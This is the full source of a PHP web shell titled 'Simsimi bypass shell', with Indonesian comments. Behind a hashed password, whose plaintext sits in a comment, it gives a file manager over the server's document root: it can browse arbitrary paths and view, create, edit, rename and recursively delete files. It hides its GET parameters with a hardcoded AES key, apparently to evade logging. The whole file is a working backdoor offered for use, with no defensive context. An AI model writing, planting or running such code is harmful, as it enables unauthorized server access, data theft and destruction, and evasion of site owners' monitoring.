<?php
session_start();

// Password hash dari 'kontolanjing123!'
$hashed_password = '$2a$12$mYYoiFtZlbS1Mz524CciNeJpjzqETRHSZDlX6XJvJyCdwAv/0v5jq';

if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit();
    } else {
        echo "<style>body{background:black;color:red;text-align:center;}</style>";
        echo "<h3>Password salah!</h3>";
        displayPasswordForm();
    }
} elseif (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    displayPasswordForm();
} else {
    displayPageContent();
}

function displayPasswordForm() {
    echo '
    <style>
        body {
            background-color: black;
            color: green;
            font-family: Courier New, monospace;
            text-align: center;
            padding-top: 20%;
        }
        input {
            background-color: #111;
            color: green;
            border: 1px solid green;
            padding: 5px;
        }
    </style>
    <form method="post">
        <h2>Simsimi bypass shell Login</h2>
        <input type="password" name="password" placeholder="Password"><br><br>
        <input type="submit" value="Login">
    </form>';
}

function displayPageContent() {
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);

    function encrypt($plaintext, $key) {
        $iv_length = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($iv_length);
        $encrypted = openssl_encrypt($plaintext, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($encrypted . '::' . $iv);
    }

    function decrypt($ciphertext, $key) {
        list($encrypted_data, $iv) = explode('::', base64_decode($ciphertext), 2);
        return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
    }

    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2';
    foreach ($_GET as $c => $d) $_GET[$c] = decrypt($d, $key);

    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    echo '
    <style>
        body {
            background-color: black;
            color: green;
            font-family: Courier New, monospace;
            padding: 10px;
        }
        a {
            color: lime;
            text-decoration: none;
        }
        input, textarea {
            background-color: #111;
            color: green;
            border: 1px solid green;
            padding: 4px;
            font-family: Courier New;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            border: 1px solid green;
            padding: 4px;
            text-align: left;
        }
        .path {
            margin-bottom: 10px;
        }
        .form-box {
            margin-bottom: 10px;
        }
        .result-box {
            width: 100%;
            height: 200px;
            background: #000;
            color: green;
        }
        .logout {
            position: fixed;
            bottom: 10px;
            right: 10px;
        }
    </style>';

    echo "<h2>[ Simsimi bypass shell ]</h2>";
    echo "<div class='path'>Current Path: ";
    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        $currentPath .= ($index === 0 ? '' : DIRECTORY_SEPARATOR) . $dir;
        echo '<a href="?d=' . urlencode(encrypt($currentPath, $key)) . '">' . $dir . '</a>/';
    }
    echo "</div>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!empty($_POST['folder_name'])) {
            mkdir($currentDirectory . '/' . $_POST['folder_name']);
        } elseif (!empty($_POST['file_name'])) {
            file_put_contents($currentDirectory . '/' . $_POST['file_name'], '');
        } elseif (!empty($_POST['edit_file']) && isset($_POST['file_content'])) {
            file_put_contents($currentDirectory . '/' . $_POST['edit_file'], $_POST['file_content']);
        } elseif (!empty($_POST['view_file'])) {
            $file = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($file)) {
                echo "<textarea class='result-box'>" . htmlspecialchars(file_get_contents($file)) . "</textarea>";
            }
        } elseif (!empty($_POST['delete_file'])) {
            $target = $currentDirectory . '/' . $_POST['delete_file'];
            if (is_file($target)) unlink($target);
            elseif (is_dir($target)) deleteDirectory($target);
        } elseif (!empty($_POST['old_name']) && !empty($_POST['new_name'])) {
            $old = $currentDirectory . '/' . $_POST['old_name'];
            $new = $currentDirectory . '/' . $_POST['new_name'];
            rename($old, $new);
        }
    }

    echo '<div class="form-box"><form method="post"><input type="text" name="folder_name" placeholder="New Folder"><input type="submit" value="Create Folder"></form></div>';
    echo '<div class="form-box"><form method="post"><input type="text" name="file_name" placeholder="New File"><input type="submit" value="Create File"></form></div>';
    echo '<div class="form-box"><form method="post"><input type="text" name="edit_file" placeholder="Edit File"><br><textarea name="file_content" placeholder="Content"></textarea><br><input type="submit" value="Save File"></form></div>';
    echo '<div class="form-box"><form method="post"><input type="text" name="view_file" placeholder="View File"><input type="submit" value="View"></form></div>';

    echo "<table><tr><th>Name</th><th>Size</th><th>Actions</th></tr>";
    foreach (scandir($currentDirectory) as $item) {
        if ($item === '.') continue;
        $itemPath = $currentDirectory . '/' . $item;
        echo "<tr>";
        echo "<td><a href='?d=" . urlencode(encrypt(is_dir($itemPath) ? $itemPath : $currentDirectory, $key)) . "'>" . htmlspecialchars($item) . "</a></td>";
        echo "<td>" . (is_file($itemPath) ? filesize($itemPath) . " bytes" : '[DIR]') . "</td>";
        echo "<td>
            <form method='post' style='display:inline'>
                <input type='hidden' name='view_file' value='" . htmlspecialchars($item) . "'>
                <input type='submit' value='View'>
            </form>
            <form method='post' style='display:inline'>
                <input type='hidden' name='delete_file' value='" . htmlspecialchars($item) . "'>
                <input type='submit' value='Delete'>
            </form>
            <form method='post' style='display:inline'>
                <input type='hidden' name='old_name' value='" . htmlspecialchars($item) . "'>
                <input type='text' name='new_name' placeholder='Rename'>
                <input type='submit' value='Go'>
            </form>
        </td>";
        echo "</tr>";
    }
    echo "</table>";

    echo '<div class="logout"><form method="post"><input type="submit" name="logout" value="Logout"></form></div>';

    if (isset($_POST['logout'])) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    function deleteDirectory($dir) {
        if (!is_dir($dir)) return false;
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            is_dir($path) ? deleteDirectory($path) : unlink($path);
        }
        return rmdir($dir);
    }
}
?>
